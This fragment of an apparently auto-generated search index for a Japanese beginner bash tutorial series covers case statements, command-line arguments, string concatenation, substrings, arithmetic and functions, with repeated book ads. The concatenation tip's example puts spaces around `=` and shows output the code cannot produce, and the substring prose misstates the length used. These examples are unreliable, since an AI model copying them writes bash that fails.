XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/","title":"【１２．case 文】ざっくりわかる「シェルスクリプト」"},{"content":"コマンドラインから引数を取得 コマンドラインから引数を取得：\nBashスクリプトは、他のプログラミング言語と同様に、コマンドライン引数から入力を読み取ることができます。たとえば、$1と$2の変数は、最初と2番目のコマンドライン引数を読み取るために使用されます。「command_line.sh」という名前のファイルを作成し、次のスクリプトを追加します。次のスクリプトによって読み取られた2つの引数値は、引数の総数と引数値を出力として出力します。\n#!/bin/bash echo \u0026#34;引数の数 : $#\u0026#34;; echo \u0026#34;一つ目の引数 = $1\u0026#34;; echo \u0026#34;二つ目の引数 = $2\u0026#34;; bashコマンドでファイルを実行します。\n$ bash command_line.sh apple windows 引数の数 : 2 一つ目の引数 = apple 二つ目の引数 = windows $ ヒント echo の引数として変数を渡すときは、\u0026quot;$1\u0026quot; のようにダブルクォートで囲む癖をつけます。 $1 のようにダブルクォートで囲まずに変数をそのまま記述してしまうと、値として連続するスペースが含まれていたときに1つのスペースにまとめられてしまいます。また、値が入っていない場合に、正しく処理ができなくなります。 シェルスクリプトの変数はほとんどの場合は \u0026ldquo;$value\u0026rdquo; と囲みます。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/","title":"【１３．コマンドラインから引数を取得】ざっくりわかる「シェルスクリプト」"},{"content":"名前を使用してコマンドラインから引数を取得する コマンドラインから名前付きの引数を取得：\n名前付きのコマンドライン引数を読み取る方法を示します。\u0026lsquo;command_line_names.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、XとYの2つの引数がこのスクリプトによって読み取られ、XとYの合計が出力されます。\n#!/bin/bash for arg in \u0026#34;$@\u0026#34;;do index=$(echo $arg | cut -f1 -d=); val=$(echo $arg | cut -f2 -d=); case $index in X) x=$val;; Y) y=$val;; *) esac done ((result=x+y)); echo \u0026#34;X+Y=$result\u0026#34;; bashコマンドで二つのコマンドライン引数を使用して、ファイルを実行します。\n$ bash command_line_names.sh X=45 Y=30 X+Y=75 $ ヒント case文で入力された文字列の大文字と小文字に対応する。 または文字列に対応する場合は以下のソースを見て欲しい。 レベルアップしたソースコードはささいな気遣いから生まれる #! /bin/bash case \u0026#34;$1\u0026#34; in [Yy]|\u0026#34;yes\u0026#34;)\t#Y、yまたはyesという文字列 echo \u0026#34;YES\u0026#34; echo \u0026#34;OK\u0026#34; ;; [Nn]|\u0026#34;no\u0026#34;)\t#N、nまたはnoという文字列 echo \u0026#34;NO\u0026#34; ;; *) echo \u0026#34;undefined\u0026#34;;; esac 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/","title":"【１４．名前を使用してコマンドラインから引数を取得する】ざっくりわかる「シェルスクリプト」"},{"content":"変数に2つの文字列を組み合わせる 文字列変数を組み合わせる：\n文字列変数はbashで簡単に組み合わせることができます。「string_combine.sh」という名前のファイルを作成し、次のスクリプトを追加して、変数を一緒に配置するか、「+」演算子を使用して、bashで文字列変数を組み合わせる方法を確認します。\n#!/bin/bash string1=\u0026#34;Apple\u0026#34;; string2=\u0026#34;Mac OS\u0026#34;; echo \u0026#34;$string1 $string2\u0026#34;; string3=\u0026#34;$string1 $string2\u0026#34;; string3+=\u0026#34; は、とても優れたＯＳです。\u0026#34; ; echo $string3; bashコマンドでファイルを実行します。\n$ bash string_combine.sh Apple Mac OS Apple Mac OS は、とても優れたＯＳです。 $ ヒント Bash は += 演算子を用いて文字列を連結することもできます。単純に a+=b とすると、a=a+b と理解することができます。 変数と文字列の結合は変数を{} でくくります。以下のソースを見て下さい。\n#!/bin/sh str1 = \u0026#34;Shell script\u0026#34; str = \u0026#34;${str1} is intersting!!\u0026#34; echo $str $ bash string_example2.sh $ Shell script is interesting!! $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/","title":"【１５．変数に2つの文字列を組み合わせる】ざっくりわかる「シェルスクリプト」"},{"content":"文字列の部分文字列を取得する 文字列の部分文字列を取得します。\n他のプログラミング言語と同様に、bashには文字列データから値を切り取る組み込み関数はありません。ただし、次のスクリプトに示すbashで、別の方法で部分文字列のタスクを実行できます。スクリプトをテストするには、次のコードを使用して「substring_example.sh」という名前のファイルを作成します。ここで、値6は部分文字列が開始する開始点を示し、5は部分文字列の長さを示します。\n#!/bin/bash Str=\u0026#34;Learn Bash from NLP\u0026#34;; subStr=${Str:6:4}; echo \u0026#34;$subStr\u0026#34;; bashコマンドでファイルを実行します。\n$ bash substring_example.sh Bash $ ヒント 基本パターンは以下の通り ${パラメータ:オフセット:長さ}\n: Bashでの文字列の切り出しはかなりの頻度で使います。 知っているのと知らないのとでは、苦労が違ってきます。 具体例を以下にしめします。 #!/bin/bash HOGE=\u0026#34;abcdef\u0026#34; # オフセット位置から長さ分を取得 echo ${HOGE:0:2} # -\u0026gt; ab echo ${HOGE:2:2} # -\u0026gt; cd echo ${HOGE:4:2} # -\u0026gt; ef # 長さを省略した場合はオフセットから最後まで出力 echo ${HOGE:2} # -\u0026gt; cdef # 長さにマイナスを指定した場合は最後からマイナス分引いた位置までの長さになる echo ${HOGE:0:-2} # -\u0026gt; abcd # オフセットの位置にマイナスを指定した場合は文法として別のパラメータ展開になる(デフォルト値の指定) # 指定した変数が空文字列の場合は右に指定した文字が入る echo ${HOGE:-2} # -\u0026gt; abcdef HOGE= echo ${HOGE:-2} # -\u0026gt; 2 #!/bin/bash HOGE=hoge.tar.bz2 echo ${HOGE} # -\u0026gt; hoge.tar.bz2 # 最短除外 echo ${HOGE%.*} # -\u0026gt; hoge.tar # 最長除外 echo ${HOGE%%.*} # -\u0026gt; hoge #!/bin/bash HOGE=/home/user/hoge echo ${HOGE} # -\u0026gt; /home/user/hoge # 最短除外 echo ${HOGE#*/} # -\u0026gt; home/user/hoge # 最長除外 echo ${HOGE##*/} # -\u0026gt; hoge 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/","title":"【１６．文字列の部分文字列を取得する】ざっくりわかる「シェルスクリプト」"},{"content":"変数に2つの数値を追加します 2つの数字を追加します。\nさまざまな方法でbashの算術演算を実行できます。次のスクリプトに、二重角かっこを使用してbashに2つの整数を追加する方法を示します。次のコードを使用して、「add_numbers.sh」という名前のファイルを作成します。2つの整数値がユーザーから取得され、加算の結果が出力されます。\n#!/bin/bash echo \u0026#34;最初の数値を入力\u0026#34;; read x; echo \u0026#34;2番目の数値を入力\u0026#34;; read y; ((sum=x+y)); echo \u0026#34;加算の結果=$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash add_numbers.sh 最初の数値を入力 25 2番目の数値を入力 56 加算の結果=81 $ ヒント ((sum=x+y)); 昔の書籍でシェルスクリプトを勉強している人は、驚くかもしれない。だが、今の時代、Bashでは上記のように書く。昔は $ echo `expr 1 + 1`\nこんな書き方をした。現在のBashでは算術演算子が使える。\n以下ににまとめてみた。2重括弧でくくればいい。2重括弧の中に変数を使うことも可能だ。さらに変数は見にくい「$」をつける必要すらない。 $ echo `expr 1+1` # 昔のやり方 $ echo $((5+5)) # 今のやり方 $ echo $((5-5)) $ echo $((5*5)) $ echo $((5/5)) $ echo $((5%5)) # なんと比較演算子もいける！ $ echo $((0==1)) # 等号、結果: 0 $ echo $((0!=1)) # 否定等号、結果: 1 $ echo $((0\u0026lt;1)) # 未満、結果: 1 $ echo $((0\u0026lt;=1)) # 以下、結果: 1 $ echo $((0\u0026gt;1)) # 大なり、結果: 0 $ echo $((0\u0026gt;=1)) # 以上、結果: 0 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/","title":"【１７．変数に2つの数値を追加します】ざっくりわかる「シェルスクリプト」"},{"content":"関連記事\nざっくりわかるシェルスクリプト１」\nざっくりわかるシェルスクリプト２」\nざっくりわかるシェルスクリプト３」\n関数を作成する 関数の作成：\n簡単な関数を作成して関数を呼び出す方法を次のスクリプトに示します。\u0026lsquo;function_example.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。bashスクリプトで角かっこを使用せずに、名前でのみ関数を呼び出すことができます。\n#!/bin/bash function 関数の名前(){ 処理 } このとき、functionは省略可能です。\n#!/bin/bash 関数の名前(){ 処理 } 関数の呼び出しは、関数を定義した後に関数の名前を書くだけです。\n関数の名前 引数 #!/bin/bash # 関数の定義 function say_hello(){ echo \u0026#34;Hello, world!\u0026#34;; } # # 関数の呼び出し say_hello; ヒント このとき、関数の名前に続けて、引数を書くことができます。関数内では、通常のシェルスクリプトの引数を処理するのと同じように$1、$2、\u0026hellip;という形でアクセスできます。 #!/bin/bash # 関数の定義 function say_hello(){ # 引数を受け取って表示 echo \u0026#34;$1, world!\u0026#34;; } # # 関数の呼び出し 引数を渡す say_hello \u0026#34;Hello\u0026#34;; bashコマンドでファイルを実行します。\n$ bash function_example.sh Hello, world! $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 